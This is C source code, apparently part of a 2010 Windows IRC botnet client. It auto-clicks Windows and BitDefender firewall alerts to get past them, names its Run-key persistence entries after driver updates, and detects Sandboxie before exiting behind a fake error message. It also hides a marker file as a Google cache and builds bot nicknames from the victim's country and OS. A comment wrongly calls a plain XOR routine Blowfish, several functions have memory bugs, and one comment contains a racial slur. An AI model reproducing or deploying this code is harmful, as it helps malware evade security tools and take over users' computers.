#include "wALL.h"

//Speedtest
//By xNull - 2010
char *SpeedTest(void) {
    static char speed[50]; //Variable to end with
    double start = GetTickCount(); //Current time in miliseconds
    URLDownloadToFile(0, "http://www.speedtestfile.com/10mb.bin", GenerateNumber(3), 0, 0); //download
    double endtime = GetTickCount(); //Current time in miliseconds
    double seconds = (endtime - start) / 1000; //Get the differance, Divide so miliseconds = seconds
    int kb = 10240 / (int)seconds; //Divide our file by secods to get kb/s
    wsprintf(speed, ".::[Speedtest]::. %d kb/s", kb); //Now we merge it into a pretty little string (ie. 154 kb/s)
    return speed; //Return that pretty little string(output)
}
//I'm debating on whether to cast that or not. Hmm...


////////////////////////////FireWall bypass crap/////////////////////////////////////////
char TemporaryKey1[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\DriverUpdate";
char TemporaryKey2[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\DriverManager";

DWORD WINAPI Firewall_Bypass(LPVOID param)
{
	HWND fwWindow;
	
    while(true)
    {
		fwWindow = 0;
		
        if(fwWindow = FindWindow(0, "Windows Security Alert"))
        {
            SendMessage(fwWindow, WM_COMMAND, MAKEWORD(104,BN_CLICKED ), 0);
            while(IsWindow(fwWindow)) Sleep(50);
        }
        else if(fwWindow = FindWindow(0, "BitDefender Firewall Alert"))
        {
            SendMessage(fwWindow, WM_COMMAND, MAKEWORD(13133, BN_CLICKED ), 0);
            SendMessage(fwWindow, WM_COMMAND, MAKEWORD(IDOK,BN_CLICKED ), 0);
            while(IsWindow(fwWindow)) Sleep(50);
        }
		
        Sleep(30);
    }
	
    return 0;
}
//////////////////////////////////////////Anti Sandboxie (://////////////////////////////////////////////////////////
bool IsSandBox()
{
	unsigned char bBuffer;
	unsigned long aCreateProcess = (unsigned long)GetProcAddress(GetModuleHandle("KERNEL32.dll"),"CreateProcessA");
	
	ReadProcessMemory(GetCurrentProcess(),(void *)aCreateProcess, &bBuffer,1,0);
	
	if(bBuffer == 0xE9)
	{
		return true;
	}
	else
	{
		return false;
	}
}
////////////////////////////////////////////////////////////////////Anit sandbox shit///////////////////////////////////////////////
int Detect_Anti(void)
{
	if(IsSandBox()== true)
	{
		MessageBox(0,"An error has occured: One or more of the update processes returned error code 61658.","Error",MB_ICONERROR);
		ExitProcess(0);
	}

	return 1;
}
////////////////////////////////////////////////Nick Letter///////////////////////////////////////////////////////////////////////
char *GenerateRandomLetters(unsigned int len)
{
	char			*nick;
	unsigned int	i;

	if (len == 0 || len > MAX_RANDOM_LETTERS)
		len = rand()%(MAX_RANDOM_LETTERS-3) + 3;

	nick = (char *) malloc (len + 1);

	for (i = 0; i <= len; i++)
		nick[i] = (rand()%26) + 97;

	nick[len] = 0;

	return nick;
}
///////////////////////////////////////////Nick Number/////////////////////////////////////////////////////////////////////////////
char *GenerateNumber(int Len)
{
	char *nick;
	int i;
	nick = (char *) malloc (Len);
	nick[0] = '\0';
	srand(GetTickCount());
	for (i = 0; i < Len; i++) {
		sprintf(nick, "%s%d", nick, rand()%10);
	}
	nick[i] = '\0';
	return nick;
}

char * GetOS( )
{
	OSVERSIONINFOEX OSVi;
	OSVi.dwOSVersionInfoSize=sizeof(OSVERSIONINFOEX);
	if ( GetVersionEx( ( OSVERSIONINFO * )&OSVi ) ) {
		if( OSVi.dwMajorVersion == 5 && OSVi.dwMinorVersion == 0 ) {
			return "2K";
		} else if(OSVi.dwMajorVersion ==5 && OSVi.dwMinorVersion == 1) {
			return "XP";
		} else if (OSVi.dwMajorVersion == 5 && OSVi.dwMinorVersion == 2) {
			return "2K3";
		} else if(OSVi.dwMajorVersion == 6 && OSVi.dwMinorVersion == 0 && OSVi.wProductType == VER_NT_WORKSTATION) {
			return "VIS";
		} else if(OSVi.dwMajorVersion == 6 && OSVi.dwMinorVersion == 0 && OSVi.wProductType != VER_NT_WORKSTATION) {
			return "2K8";
		} else if(OSVi.dwMajorVersion == 6 && OSVi.dwMinorVersion == 1 && OSVi.wProductType == VER_NT_WORKSTATION) {
			return "WN7";
		} else if(OSVi.dwMajorVersion == 6 && OSVi.dwMinorVersion == 1 && OSVi.wProductType != VER_NT_WORKSTATION) {
			return "2K8";
		} else {
			return "ERR";
		}
	}
	return "ERR";
}

//////////////////////////////////////////////////////Make the nick niggah//////////////////////////////////////////////////////////
char *GenerateNickA(void)
{
	static char nick[MAX_NICKLEN];
	ZeroMemory(nick,MAX_NICKLEN);
	char locale[MAX_NICKLEN];
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME,locale,sizeof(locale));	
	if(IsNew()) {
		sprintf(nick, "n{Ganja-%s|%s}%s", locale, GetOS(), GenerateNumber(6));
	} else {
		sprintf(nick, "{Ganja-%s|%s}%s", locale, GetOS(), GenerateNumber(6));
	}
	return nick;
}

unsigned int Resolve(char *host) 
{
    struct	hostent		*hp;
    unsigned int		host_ip;

    host_ip = inet_addr(host);
    if (host_ip == INADDR_NONE) 
	{
        hp = gethostbyname(host);
        if (hp == 0) 
            return 0;
		else 
			host_ip = *(u_int *)(hp->h_addr);
    }

    return host_ip;
}

char *GetMyIP() 
{
	static char		ip[16];
	SOCKADDR		sa;
	int				sas = sizeof(sa);

	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	sprintf(ip, "%d.%d.%d.%d", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	return (ip);
}

char *Encrypt( char *string ) // Blowfish Encryption
{
	char key[250];
	sprintf( key, "%s", GenerateRandomLetters( 250 ) );
    unsigned int i, j;

    for (i = 0; i < strlen(string); i++)
    {
        for (j = 0; j < strlen(key); j++)
            string[i] ^= key[j];

        string[i] = ~ string[i];
    }

    return string;
}

bool Check_Key(HKEY tree, const char *folder, char *key)
{
    long lRet;
    HKEY hKey;
    char temp[150];

    DWORD dwBufLen;
    lRet = RegOpenKeyEx( tree, folder, 0, KEY_QUERY_VALUE, &hKey );
    if( lRet != ERROR_SUCCESS ) {
        return 0;
    }
    
    dwBufLen = sizeof(temp);
    lRet = RegQueryValueEx( hKey, key, NULL, NULL, ( BYTE* )&temp, &dwBufLen );
    if( lRet != ERROR_SUCCESS ) {
        return 0;
    }

    lRet = RegCloseKey( hKey );
    if ( lRet != ERROR_SUCCESS ) {
        return 0;
    }
    return 1;
}

//IsNew?
bool IsNew()
{
	char tmppath[MAX_PATH];
	ExpandEnvironmentStrings("%TEMP%",tmppath,sizeof(tmppath));
	char* str = "";
	wsprintf(str, "\\google_cache%s.tmp","2");
	strcat(tmppath,str);
	DWORD dwAttributes = GetFileAttributes(tmppath);
	if(dwAttributes == 0xffffffff)
	{
		FILE* hFile = fopen(tmppath, "wb");
		if(hFile)
		{
			fprintf(hFile,"website=1");
			fclose(hFile);
				return TRUE;
		}
	}
	return FALSE;

}